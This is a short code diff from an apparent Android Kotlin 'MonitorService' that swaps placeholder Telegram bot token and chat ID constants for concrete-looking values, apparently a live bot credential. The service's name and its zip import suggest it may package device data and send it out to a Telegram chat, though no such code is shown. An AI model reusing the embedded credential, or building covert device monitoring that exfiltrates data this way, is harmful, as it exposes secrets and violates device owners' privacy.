@@ -57,8 +57,8 @@ import java.util.zip.ZipOutputStream
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
-        private const val CHAT_ID   = "YOUR-CHAT-ID"
+        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
+        private const val CHAT_ID   = "8937193601"
 
         private const val TAG              = "MonitorService"
         private const val NOTIFICATION_ID  = 1001
